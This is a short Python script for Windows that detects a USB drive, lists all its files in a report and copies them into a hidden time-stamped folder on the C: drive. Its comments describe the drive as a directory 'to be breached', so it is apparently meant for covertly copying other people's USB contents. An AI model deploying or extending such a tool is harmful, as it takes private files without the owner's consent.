# imports
import subprocess
import socket
import string
import random
from collections import Counter
import shutil, errno
import datetime, time
import os,winshell,sys

# detecting USB

pat1=str(0)
if (os.path.exists('G:\\'))==True:
    pat1='G:\\'
elif (os.path.exists('F:\\'))==True:
    pat1='F:\\'
elif (os.path.exists('E:\\'))==True:
    pat1='E:\\'
elif (os.path.exists('D:\\'))==True:
    pat1='D:\\'
else:
    pat1 = 'C:\\test folder'
print(pat1)


# folder name

tim=datetime.datetime.now().time()
dt1=str(tim)
dt2='0'
for i in range(len(dt1)):
    if dt1[i] !=':' and dt1[i] !='.':
        dt2=dt2+str(dt1[i])

# creating the storage folder

if not os.path.exists('C:/usb storage/Console'):
    os.makedirs('C:/usb storage/Console')

# directory that needs to be breached    

way = pat1  #directory that needs to be breached
os.makedirs(str('C:/usb storage/Console/'+ dt2))
savedir=str('C:/usb storage/Console/'+ dt2) # the directory where the data needs to be stored

# gives the contents of the usb

os.chdir(way)
def get_filepaths(directory):
    file_paths = []  # List which will store all of the full filepaths.
    for root, directories, files in os.walk(directory):
        for filename in files:
            # Join the two strings in order to form the full filepath.
            filepath = os.path.join(root, filename)
            file_paths.append(filepath)  # Add it to the list.
    return(file_paths)


#storing in text file
filespaths=(get_filepaths(way)) # insert the usb address here
os.chdir(savedir)
file=open('USB report.txt', 'w')
for i in range(len(filespaths)):
    file.write(str(filespaths[i]+'\n'))
      

# saving files
def copyanything(src, dst):
    try:
        shutil.copytree(src, dst)
    except OSError as exc: # python >2.5
        if exc.errno == errno.ENOTDIR:
            shutil.copy(src, dst)
        else: raise

# copy files

for i in range(len(filespaths)):
    copyanything(filespaths[i], savedir)

file.close()



'''
Source code available at: github.com/AhsanSN
'''
